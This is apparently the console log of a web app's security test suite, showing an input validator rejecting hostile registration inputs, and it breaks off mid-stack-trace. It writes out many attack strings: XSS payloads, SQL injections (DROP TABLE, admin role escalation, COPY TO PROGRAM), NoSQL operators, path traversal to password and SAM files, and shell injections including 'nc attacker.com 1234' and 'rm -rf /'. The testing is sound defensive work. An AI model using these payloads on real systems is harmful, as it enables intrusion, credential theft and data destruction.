[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <select onfocus=alert(1) 
autofocus>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <textarea onfocus=alert(1) 
autofocus>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <marquee onstart=alert(1)>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te XSS: <div 
style="background:url(javascript:alert(1))">
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:34:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: '; DROP TABLE user; --
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in email
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: ' OR '1'='1
[22m[39mcreateTestUser error: Error: Validation 
error: invalid email input
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:122:40)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: '; DELETE FROM user 
WHERE '1'='1'; --
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in email
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: 1'; UPDATE user SET 
role='admin' WHERE '1'='1
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in email
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstdout[2m | tests/unit/validation.test.ts
[22m[39m
Ô£à Test suite complete


[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: ' UNION SELECT * FROM 
pg_authid --
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in email
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

 [32mÔ£ô[39m tests/unit/validation.test.ts [2m([22m[2m96 tests[22m[2m)[22m[33m 748[2mms[22m[39m
[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: '; COPY (SELECT '') 
TO PROGRAM 'id'; --
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in email
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: admin'--
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in email
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: ' or 1=1--
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in email
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te SQL injection: ') OR ('1'='1
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in email
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:40:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te NoSQL injection: {"$ne":null}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous NoSQL input in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:107:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:46:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te NoSQL injection: {"$gt":""}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous NoSQL input in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:107:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:46:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te NoSQL injection: 
{"$where":"this.password.length > 0"}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous NoSQL input in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:107:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:46:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te NoSQL injection: {"$regex":".*"}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:46:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te NoSQL injection: {"$or":[{}]}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous NoSQL input in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:107:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:46:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te NoSQL injection: 
{"$and":[{"$where":"1==1"}]}
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous NoSQL input in username
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:107:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:46:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te path traversal: ../../../etc/passwd
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in username
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:52:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te path traversal: 
..\..\..\windows\system32\config\sam
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in username
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:52:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te path traversal: 
....//....//etc/shadow
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in username
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:52:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te path traversal: 
..%2f..%2f..%2fetc%2fpasswd
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in username
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:52:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te path traversal: 
..%252f..%252fetc%252fpasswd
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in username
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:52:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te command injection: ; cat /etc/passwd
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in name
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:58:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te command injection: && whoami
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in name
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:58:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te command injection: | id
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in name
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:58:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te command injection: `id`
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in name
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:58:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te command injection: $(id)
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in name
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:58:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te command injection: | nc attacker.com 
1234
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in name
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:58:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te command injection: ; rm -rf /
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in name
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:58:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te null bytes: user @example.com
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous input in email
    at rejectDangerous (C:/Users/Utilisateur/Documents
/concordia/src/lib/auth/validate-user.ts:37:45)
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:116:5)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:64:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mInscription S├®curis├®e[2m > 
[22m[2mrej├¿te null bytes: 
test <script>alert(1)</script>
[22m[39mcreateTestUser error: Error: Validation 
error: dangerous command injection in email
    at validateUserInput (C:/Users/Utilisateur/Documen
ts/concordia/src/lib/auth/validate-user.ts:113:13)
    at createTestUser (C:/Users/Utilisateur/Documents/
concordia/tests/utils/auth-test-utils.ts:97:9)
[90m    at processTicksAndRejections 
